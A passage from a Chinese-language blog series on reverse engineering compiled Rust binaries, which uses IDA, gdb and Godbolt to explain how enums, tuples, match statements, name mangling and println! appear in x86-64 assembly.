[rsp + 4], 3</span><br><span class="line">        mov     dword ptr [rsp + 8], 5</span><br><span class="line">        mov     dword ptr [rsp + 12], 7</span><br><span class="line">        mov     dword ptr [rsp + 16], 11</span><br><span class="line">        mov     rax, qword ptr [rsp + 48]</span><br><span class="line">        mov     qword ptr [rsp + 24], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 56]</span><br><span class="line">        mov     qword ptr [rsp + 32], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 64]</span><br><span class="line">        mov     qword ptr [rsp + 40], rax</span><br><span class="line">        mov     rdi, rsp</span><br><span class="line">        call    qword ptr [rip + core::ptr::drop_in_place&lt;(i32,i32,i32,i32,i32,alloc::string::String)&gt;@GOTPCREL]</span><br><span class="line">        add     rsp, 72</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>
<p>从相对于<code>rsp</code>的偏移量可以看出Tuple的排布情况，上述Tuple的内存排布顺序与数据的定义顺序相同。</p>
<p>但对于下面一个Tuple而言就不同了：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = (<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="type">String</span>::<span class="title function_ invoke__">new</span>(), <span class="string">&quot;CoLin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>逆向的结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        sub     rsp, 88</span><br><span class="line">        lea     rdi, [rsp + 64]</span><br><span class="line">        call    alloc::string::String::new</span><br><span class="line">        mov     dword ptr [rsp + 24], 2</span><br><span class="line">        mov     dword ptr [rsp + 28], 3</span><br><span class="line">        mov     dword ptr [rsp + 32], 5</span><br><span class="line">        mov     dword ptr [rsp + 36], 7</span><br><span class="line">        mov     dword ptr [rsp + 40], 11</span><br><span class="line">        mov     rax, qword ptr [rsp + 64]</span><br><span class="line">        mov     qword ptr [rsp], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 72]</span><br><span class="line">        mov     qword ptr [rsp + 8], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 80]</span><br><span class="line">        mov     qword ptr [rsp + 16], rax</span><br><span class="line">        lea     rax, [rip + .L__unnamed_1]</span><br><span class="line">        mov     qword ptr [rsp + 48], rax</span><br><span class="line">        mov     qword ptr [rsp + 56], 5</span><br><span class="line">        mov     rdi, rsp</span><br><span class="line">        call    qword ptr [rip + core::ptr::drop_in_place&lt;(i32,i32,i32,i32,i32,alloc::string::String,&amp;str)&gt;@GOTPCREL]</span><br><span class="line">        add     rsp, 88</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>
<p>可以看到，这里是将<code>String::new()</code>产生的<code>String</code>实例放在了开头，随后才是5个<code>i32</code>，最后是<code>&amp;str</code>。至于为什么要这样排列，询问了一个Rust大手子之后，给到的答案是：Rust数据结构和内存排布没有必然关联，Rust编译器可能根据不同的架构进行相应的内存结构调整，说人话就是——<font color=red><strong>不能预判，不是必然顺序排列</strong></font>。不过考虑到对于Tuple的遍历、索引等操作在代码中都是固定的，编译器在编译的时候完全可以将地址偏移与索引值一一对应，不影响正常的索引，但对于反编译则是一个巨大的噩梦，因为你不确定某个索引值的数据到底有多少偏移。另外，如何通过汇编代码对栈空间的布局判断是否存在一个tuple也是一个问题。在定义变量时，一个tuple完全可以拆分为多个变量进行定义，反正在汇编代码中也不会保存临时变量的变量名。这在内存中会表现出来不同吗？</p>
<p>我们还是通过实际验证来解答我们的问题。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = (<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, x.<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">z</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span> = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">b</span> = <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">c</span> = <span class="number">13</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&quot;</span>, x, y, z, a, b, c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>给出上面的两个Rust函数，通过查看6个整数值在内存中的排布可以发现，两者对于6个整数值都是按相同顺序进行排列，从低地址到高地址依次为2、3、5、7、11、13。不过在编译过程中发现，只有当变量被使用时，Rust编译器才会将这个变量编译到ELF中，否则这个变量将不会出现在ELF中。也就是说，我们不能仅仅通过栈内存排布判断源代码中是否定义了Tuple。不过转念一想，这样其实是合理的。Tuple实际上就相当于是一个匿名的结构体实例，想一想C语言中的结构体，实际上也就是将一堆各种类型的数据集合在一起，使用相邻的内存空间保存各个属性而已。定义一个具有两个int类型的C语言结构体，将其在栈内存中分配一个实例空间，与在栈内存中分配两个int类型的变量，在本质上是完全相同的。</p>
<p>因此，我们在对Rust ELF进行逆向分析时，不必纠结源码的编写者是否定义了元组，全部将其看做独立的变量就可以了。</p>
<h2 id="0x04-guess-a-number-part-2"><a class="markdownIt-Anchor" href="#0x04-guess-a-number-part-2"></a> 0x04. Guess a number .part 2</h2>
<p>好不容易说完了对Rust枚举类型和元组的逆向，接下来让我们回到最开始的那个程序，说到两个match语句。</p>
<p>对于第一个<code>match</code>语句，<code>match</code>的对象是一个枚举类型，在<code>match</code>语句体之内实际上是按照枚举类型进行分支。在汇编语句中，Rust是这样完成分支的：</p>
<p><img src="5.png" alt="" /></p>
<p>注意<code>0xCEAC</code>处的指令：<code>mov al, byte ptr [rsp+1D8h+var_C0]</code>，第二个操作数是<code>parse</code>方法的返回值，也就是<code>Result&lt;F, F::Err&gt;</code>。考虑到这里的<code>F</code>是<code>u32</code>类型，整个枚举类型占用的空间大小为8字节，因此<code>rax</code>返回的直接就是对象本身的内容（<code>0x??_0000_0000</code>）。第1个字节为枚举索引值，后4个字节为转换后的值。在<code>0xCEAC</code>地址的这条指令将第1个字节赋值给<code>al</code>后进行了比较（<code>cmp rax, 0</code>），这也就是分支的具体实现方法——提取出枚举类型的索引值，根据索引值进行分支。</p>
<p><img src="6.png" alt="" /></p>
<p>对于后面<code>cmp</code>方法返回值的<code>match</code>与之类似，本质上使用的也是<code>if-else</code>结构，主要是因为分支数量较少，没有必要使用跳转表，分支逻辑如上图所示。不过不同的是，第一个分支是判断枚举对象索引值是否等于<code>0xFF</code>，即-1。经过调试发现，<code>Ordering::Less</code>对应的枚举索引为-1，<code>Ordering::Greater</code>对应1，<code>Ordering::Equal</code>对应0。而对于每个分支，都只是一个简单的输出语句，这里就不再分析了。</p>
<h2 id="0x05-总结"><a class="markdownIt-Anchor" href="#0x05-总结"></a> 0x05. 总结</h2>
<p>在本文中，我们学习了：</p>
<ol>
<li>Rust的枚举类型在汇编代码层的数据结构实现。</li>
<li>Rust的元组Tuple类型在汇编代码层无法被有效识别，但可将其看做多个独立变量进行分析。</li>
<li>三个<code>Ordering</code>枚举对象的索引值为-1、0、1，与一般枚举对象索引值从0开始不同。</li>
<li>Rust倾向于当变量不再使用时就删除变量对象，以尽可能地提高安全性。</li>
<li>Rust的元组类型在汇编代码层栈空间的数据排列顺序与元组类型中数据的定义顺序不一定相同。</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/10/17/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/17/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-1/" class="post-title-link" itemprop="url">Rust逆向学习 (1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-10-17 21:50:25" itemprop="dateCreated datePublished" datetime="2023-10-17T21:50:25+08:00">2023-10-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-10-19 00:05:53" itemprop="dateModified" datetime="2023-10-19T00:05:53+08:00">2023-10-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Rust%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">Rust逆向系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>6.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>近年来，Rust语言的热度越来越高，很多人都对Rust优雅的代码和优秀的安全性赞不绝口。对于开发是如此，对于CTF也是如此，在逆向题和pwn题中都有出现。从本文开始我们将开始进行Rust逆向的学习，笔者将尽可能通过现有的IDA（7.7版本）对Rust ELF文件中包含的特性进行分析与总结，尽可能地减少Rust逆向的难度，尽可能地解决分析过程中产生的每一个问题，最终争取达到能够通过IDA反汇编结果还原Rust代码的程度。</p>
<p>本系列将跟随《Rust权威指南》的学习路线完成Rust逆向工程的学习。</p>
<p>阅读本文前，建议首先掌握：</p>
<ul>
<li>✅ x86-64逆向的基础知识</li>
<li>✅ Rust语言的基本使用</li>
</ul>
<h1 id="hello-rust-reverse"><a class="markdownIt-Anchor" href="#hello-rust-reverse"></a> Hello, Rust Reverse</h1>
<p>首先我们写一个流程较猜数字稍简单一些的Rust程序，完成Rust ELF的第一次分析。<br />
以下是Rust源码：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">input</span>: <span class="type">String</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> input).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Read Error!&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">num</span> = input.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Input not a number!&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="keyword">match</span> num &#123;</span><br><span class="line">        <span class="number">1</span> =&gt; <span class="string">&quot;one&quot;</span>,</span><br><span class="line">        <span class="number">2</span> =&gt; <span class="string">&quot;two&quot;</span>,</span><br><span class="line">        x <span class="keyword">if</span> x &lt; <span class="number">10</span> =&gt; <span class="string">&quot;Something smaller than 10&quot;</span>,</span><br><span class="line">        _ =&gt; <span class="string">&quot;Something not smaller than 10&quot;</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用cargo build编译后将ELF文件放入IDA中进行分析。这个ELF文件没有去除符号表，便于分析。</p>
<h2 id="0x01-main函数定位"><a class="markdownIt-Anchor" href="#0x01-main函数定位"></a> 0x01. main函数定位</h2>
<p><img src="1.png" alt="" /></p>
<p>反汇编完成后，可以看到，左边栏的函数名大多很长，但也有一些规律可循。定位到main函数发现，main函数本身只有很少的几行代码，但Rust真正的main函数也不难找。看到<code>0xA020</code>处有一个main函数，这个项目笔者将其命名为revlab，而这个函数名中也正好就有revlab，因此可以推测出，这就是我们要找的Rust main函数。</p>
<p>但我们可以先不急着查看main函数的具体内容，单是这个main函数名就有一番研究的必要。<code>_ZN6revlab4main17h512e681518e409c2E</code>，这是Rust编译器赋予我们自己的main函数的函数名。有没有觉得这个函数名的命名规则很熟悉呢？没错，这种函数命名方式被称为<strong>name mangling</strong>，与C++编译器对函数的命名规则类似。这里参考<a target="_blank" rel="noopener" href="https://rustmagazine.github.io/rust_magazine_2021/chapter_7/hw-rust-name-mangling.html">资料</a>。我们就可以将这个函数名进行简单的翻译：<code>revlab::main</code>，前面的_ZN是固定开头，6代表下一个模块的名字长度，也就是后面的revlab，4相同，即解析main，17h后面是函数的哈希值，可以忽略。这里通过左边栏可以看到，IDA能够自动为我们完成函数名的解析。</p>
<h2 id="0x02-main函数分析"><a class="markdownIt-Anchor" href="#0x02-main函数分析"></a> 0x02. main函数分析</h2>
<p>别看我们第一次写的main函数只有短短的几行，转换成汇编之后却有点让人头疼。考虑到这是我们第一次进行分析，笔者尝试借助其他的工具辅助分析——<a target="_blank" rel="noopener" href="https://godbolt.org/">传送门</a>。这个网站可以帮助我们将源代码与汇编代码对应起来，帮助我们进行分析。</p>
<p><img src="2.png" alt="" /></p>
<p>可以看到，main函数的汇编逻辑还是比较复杂的，这也是Rust ELF的一个特点，使得Rust反汇编较C/C++更难。</p>
<h3 id="line-1"><a class="markdownIt-Anchor" href="#line-1"></a> line 1</h3>
<p>第一行定义了一个字符串变量，使用<code>String::new()</code>方法。但是在汇编中可以发现，<code>call</code>调用<code>String::new()</code>函数并没有对返回值进行操作，而是将<code>rdi</code>进行了赋值，这与C语言不同，如果按照C语言的逻辑，则更像是<code>String::new(&amp;input)</code>。随后，笔者修改了代码进行试验，发现<code>Vec</code>的<code>new</code>方法流程类似。可见各个对象的<code>new</code>方法实际上是传了参的。</p>
<h3 id="line-2"><a class="markdownIt-Anchor" href="#line-2"></a> line 2</h3>
<p>第二行就比第一行热闹多了，由于<code>io::stdin()</code>返回的是<code>Stdin</code>，代码中使用的返回值与C语言一样，保存在<code>rax</code>中。不过这里是首先将函数地址赋值给<code>rax</code>，通过<code>call rax</code>完成调用。调用完<code>stdin()</code>后，Rust不知道为什么用了一个<code>jmp</code>指令，跨越了几条指令再继续执行后面的<code>read_line</code>方法。对于<code>read_line</code>方法，可以看到前3个寄存器进行了赋值。其中<code>rsi</code>是<code>io::stdin()</code>的返回值，也就是<code>Stdin</code>对象实例，<code>rdx</code>是字符串<code>input</code>的地址，这一点可以通过第一行对<code>[rsp+80]</code>赋值得知，那么<code>rdi</code>是什么呢？这里就需要返回到IDA界面查看。</p>
<p><img src="3.png" alt="" /></p>
<p>从上图可知，IDA将第一个参数解析为<code>self</code>，类型为<code>core::result::Result&lt;usize,std::io::error::Error&gt;</code>，而这个是<code>read_line</code>函数的返回值。这与<code>io::stdin()</code>不同，也是没有将返回值保存到<code>rax</code>。随后，代码继续向下，继续调用了<code>expect</code>方法，传入的d第一个参数就是<code>Result</code>实例，第二个参数是我们设置的错误字符串<code>Read Error!</code>地址，第三个参数为11，推测是错误字符串的长度，第四个参数通过查看发现，是这段汇编代码对应的源代码在工程中的路径。由此我们可以发现，如果今后我们需要分析一个不带符号的Rust ELF，发现有一个函数有4个参数，其中第2、4个参数均为字符串，且第4个参数是源文件地址、第3个参数是第2个参数字符串的长度，那么这个函数很有可能就是<code>expect</code>，通过跟踪第一个参数<code>Result</code>对象，可以继续进行分析。</p>
<p>汇编代码看到这里，我们能够发现，即使代码顺序执行，Rust编译器也一定要在一个函数调用结束后插入一个<code>jmp</code>指令，这一点可以从调用<code>read_line</code>方法可以得知，向下不断滑动窗口也能发现，整个<code>main</code>函数似乎是被许多<code>jmp</code>指令划分为许多小部分。</p>
<h3 id="line-3"><a class="markdownIt-Anchor" href="#line-3"></a> line 3</h3>
<p><img src="4.png" alt="" /></p>
<p>第三行首先看到，代码中使用了<code>deref</code>这个方法，至于为什么使用这个方法其实很好理解。<code>deref</code>传入的是<code>String</code>实例，返回的是字符串切片<code>&amp;str</code>，而<code>trim</code>方法实际上是以切片作为<code>self</code>的，因此这里Rust隐式地将<code>String</code>转成切片之后再执行<code>trim</code>。</p>
<p>调用<code>deref</code>方法后需要注意，这里将<code>rdx</code>和<code>rax</code>保存到了栈中。记得在学习字符串切片的时候，书中有提及字符串切片实际上由两个部分组成——指针与长度。这里我们只通过静态分析无法判断<code>rdx</code>和<code>rax</code>到底是多少，虽然我们心中可能已经知道答案，但这里还是通过简单的调试来验证一下。</p>
<p><img src="5.png" alt="" /></p>
<p>可以看到，这与我们的预期是相同的，<code>rdx</code>保存的是长度，<code>rax</code>保存的是字符串指针。因此我们知道了，<code>String</code>类型的<code>deref</code>方法会将返回值保存在两个寄存器——<code>rdx</code>与<code>rax</code>中。</p>
<p>好继续往下看。随后就是<code>trim</code>方法的调用，传入的第1个参数是字符串指针，第2个参数是长度。其返回值依然是保存在两个寄存器中。可见对于返回值为<code>&amp;str</code>的Rust方法，其返回的方式也有一定规律。</p>
<p><code>trim</code>之后是<code>parse</code>，返回值是<code>Result</code>类型，和<code>read_line</code>不同的是，<code>read_line</code>返回的<code>Result</code>实例没有泛型（<code>Result&lt;usize&gt;</code>），但是<code>parse</code>的返回值是<code>Result&lt;F, F::Err&gt;</code>，可能是这个原因，导致<code>read_line</code>可以将<code>Result</code>指针直接作为参数传递，而<code>parse</code>只能通过<code>rax</code>返回。不过目前这只是猜测，有关于Rust编译器对泛型的处理，就留到后面的文章中进行分析吧。</p>
<p>随后，有几行看似没有意义的汇编代码，像是<code>mov qword ptr [rsp + 240], rax</code>，这里的<code>[rsp+240]</code>在main函数自始至终只有这里被使用过。所以直接忽略。随后<code>expect</code>的传参与之前规则相同。</p>
<p>不过这里的<code>expect</code>是需要将返回值保存在<code>num</code>中的，也就是<code>mov dword ptr [rsp + 28], eax</code>这条语句，可见<code>num</code>是保存在<code>[rsp+0x28]</code>的位置。</p>
<h3 id="line-4~9"><a class="markdownIt-Anchor" href="#line-4~9"></a> line 4~9</h3>
<p>下面的几行是一个<code>println!</code>一个<code>match</code>语句的值。在学Rust的时候我们了解到，<code>match</code>语句可以实现类似于lambda函数的功能，每一个分支的<code>=&gt;</code>后都可以看成这个条件下<code>match</code>的返回值。就如这几行是将<code>match</code>的每一个分支语句都定义一个字符串切片作为传入<code>println!</code><br />
的格式化参数。</p>
<p>在上一行语句执行结束后，汇编代码首先将<code>num</code>的值放到<code>eax</code>中，随后进行分支判断。判断顺序是：是否等于1、是否等于2、是否小于10，而且<code>match</code>的判断语句是统一写在前面，具体的语句内容则放在后面。</p>
<p>通过对分支语句简单分析，容易得到<code>match</code>语句的“返回值”是保存在<code>[rsp+208]</code>和<code>[rsp+216]</code>，因为这个是<code>&amp;str</code>，所以要用<code>0x10</code>大小保存。</p>
<p><img src="6.png" alt="" /></p>
<p>不过在汇编代码中，<code>println!</code>的处理流程可能不是都在所有<code>match</code>流程之后，而是在中间插入了一段，随后又在跳转到后面。使用1.69.0的rustc版本编译发现所有的<code>match</code>分支都位于<code>println!</code>之后，而更新版本的1.73.0则是将<code>println!</code>前半部分放在<code>match</code>分支部分中间。</p>
<p>随后则是<code>println!</code>的宏展开部分，考虑到<code>println!</code>太常见，通过IDA的反汇编输出的源代码可以识别出其特征。可以看到在汇编中调用了<code>core::fmt::ArgumentV1::new_display</code>、<code>core::fmt::Arguments::new_v1</code>、<code>std::io::stdio::_print</code>这三个方法。其中前面两个推测是Rust宏的转换函数，也就是将宏中大括号部分替换为具体的参数，而最后一个方法则是输出内容到控制台。</p>
<p>对于第一个函数，其唯一一个参数是<code>match</code>返回的字符串切片的栈地址。而对于第二个函数，传参情况则比较复杂。根据下文的<code>_print</code>函数传入的参数判断，第一个参数应该是返回值字符串的地址，第二个参数指向一个换行符的地址，但意义不明，第三个参数为2，第四个参数为第一个函数的返回值<code>rax</code>内容。第五个参数为1。目前只能确定第1个参数的含义，因此我们需要请求gdb的帮助。</p>
<p><img src="7.png" alt="" /></p>
<p>可以看到，第1个函数返回的<code>rax</code>是要输出的字符串。注意到在ELF中并没有找到左右大括号<code>&#123;&#125;</code>这个字符串，判断可能是Rust使用了其他的方式进行解析。但是除了第一个参数之外其他参数的意义还是不明。我们不妨稍稍修改一下<code>println!</code>格式化字符串的值，看看代码有什么变化。</p>
<p><img src="8.png" alt="" /></p>
<p>这里我们将字符串修改为<code>a&#123;&#125;a&#123;&#125;</code>，在后面添加一个1作为第二个括号的占位符。随后我们发现，<code>core::fmt::ArgumentV1::new_display</code>函数被调用了两次。第一次调用传入<code>match</code>返回的字符串，而第二次调用传入的是这个东西：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.L__unnamed_27:</span><br><span class="line">        .asciz  &quot;\001\000\000&quot;</span><br></pre></td></tr></table></figure>
<p>这不正好就是1吗？也就是说，<code>core::fmt::ArgumentV1::new_display</code>这个函数是用来解析<code>println!</code>后面的参数的，将其转换为字符串切片，有几个大括号就需要调用几次。随后继续进行分析，发现汇编代码将两个函数解析得到的两个字符串切片放到了一个连续的栈地址空间，并将其作为参数4（<code>rcx</code>）传入。</p>
<p><img src="9.png" alt="" /></p>
<p>如上图所示，这里红框部分就是赋值过程，这个地方像是一个数组的结构，按照顺序排列每个大括号对应的字符串切片。由此便可以判断出参数5（<code>r8d</code>）的含义，其实就是解析的字符串切片的数量。</p>
<p>接下来我们再看一下参数2到底是什么东西。参数2指向了一个这样的结构：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.L__unnamed_28:</span><br><span class="line">        .quad   .L__unnamed_36</span><br><span class="line">        .asciz  &quot;\001\000\000\000\000\000\000&quot;</span><br><span class="line">        .quad   .L__unnamed_36</span><br><span class="line">        .asciz  &quot;\001\000\000\000\000\000\000&quot;</span><br><span class="line">        .quad   .L__unnamed_37</span><br><span class="line">        .asciz  &quot;\001\000\000\000\000\000\000&quot;</span><br></pre></td></tr></table></figure>
<p>其中有：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.L__unnamed_36:</span><br><span class="line">        .byte   97      ; &#x27;a&#x27;</span><br><span class="line"></span><br><span class="line">.L__unnamed_37:</span><br><span class="line">        .byte   10      ; &#x27;\n&#x27;</span><br></pre></td></tr></table></figure>
<p>这样看来，这里的含义也就清楚了。编译器在对宏进行展开时转义大括号的内容是这样操作的：</p>
<ul>
<li>首先将含有大括号的字符串以大括号分隔，并形成上面的这个数组结构。</li>
<li>对于每一个大括号，都调用一次转义函数进行转义，在栈中形成一个<code>&amp;str</code>的数组。</li>
<li>随后再调用另外一个函数（<code>core::fmt::Arguments::new_v1</code>）将这些切片拼起来组成最终的字符串。</li>
</ul>
<p><code>core::fmt::Arguments::new_v1</code>的5个参数含义分别就是：</p>
<ul>
<li><code>rdi</code>：输出字符串指针</li>
<li><code>rsi</code>：预编译的数组结构，表示宏不需要转义的字符串部分</li>
<li><code>rdx</code>：预编译数组结构的长度</li>
<li><code>rcx</code>：运行时解析的已经被转义的<code>&amp;str</code>数组</li>
<li><code>r8</code>：运行时解析的<code>&amp;str</code>数组长度</li>
</ul>
<p>这个函数调用完之后，就可以进行宏展开的后续代码了。对于<code>println!</code>而言是输出，也即调用<code>std::io::stdio::_print</code>。</p>
<p>输出之后，后面就没有多少代码了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.LBB60_18:</span><br><span class="line">        lea     rdi, [rsp + 80]</span><br><span class="line">        call    qword ptr [rip + core::ptr::drop_in_place&lt;alloc::string::String&gt;@GOTPCREL]</span><br><span class="line">        add     rsp, 248</span><br><span class="line">        ret</span><br><span class="line">        mov     rax, qword ptr [rip + core::panicking::panic_cannot_unwind@GOTPCREL]</span><br><span class="line">        call    rax</span><br><span class="line">        ud2</span><br><span class="line">.LBB60_20:</span><br><span class="line">        mov     rdi, qword ptr [rsp + 224]</span><br><span class="line">        call    _Unwind_Resume@PLT</span><br><span class="line">        ud2</span><br></pre></td></tr></table></figure>
<p>这里的<code>core::ptr::drop_in_place</code>应该是Rust将这个<code>String</code>对象实例回收了。随后将栈上抬，main函数就正常返回了。</p>
<h2 id="0x03-ida反汇编"><a class="markdownIt-Anchor" href="#0x03-ida反汇编"></a> 0x03. IDA反汇编</h2>
<p>上一节我们对Rust ELF的分析大多是基于汇编层面进行的，当代码量比较多的时候，基本块之间的跳转关系可能会更加复杂，不利于我们的分析。不过IDA提供了非常实用的反汇编功能，在分析时，笔者认为如果我们能够将反汇编的内容与纯汇编代码相结合，效果会更好。</p>
<p>但IDA的反汇编功能一开始毕竟是为C/C++设计的，对于Rust的反汇编结果不很直观也是正常的。</p>
<p><img src="10.png" alt="" /></p>
<p>在反汇编的输出结果中，出现了比较奇怪的地方。</p>
<p>最为明显的就是字符串的解析。通过查看ELF中保存字符串的地方可以发现，Rust的字符串与字符串之间有的是以换行符隔开的，有的根本就没有分割的字符，这与C/C++使用0字符分割每个字符串不同。因为Rust字符串切片的特性，对一个字符串切片的操作必然需要使用到这个切片的长度。既然已经知道了字符串的长度，字符串与字符串之间的分隔就显得没有那么必要了。</p>
<p>不过庆幸的是，反汇编中对于main函数的主要逻辑的解析还是比较清楚的，第一行的<code>String::new()</code>表示创建了一个<code>String</code>实例，随后多个函数的调用连在一起就组成了第二行的读取字符串内容，就是<code>expect</code>函数的解析看上去不是很舒服，毕竟其与C/C++的函数调用规则有些许不同。</p>
<p>再往下，可以看到<code>deref</code>、<code>trim</code>、<code>parse</code>、<code>expect</code>，这些函数组成了第三行的内容。</p>
<p>对于接下来的<code>match</code>，在反汇编界面中是将其解析成了多个<code>if-else</code>语句。随后就是<code>println!</code>的宏展开，输出字符串。输出后通过<code>drop_in_place</code>删除了一开始创建的<code>String</code>实例，函数返回。</p>
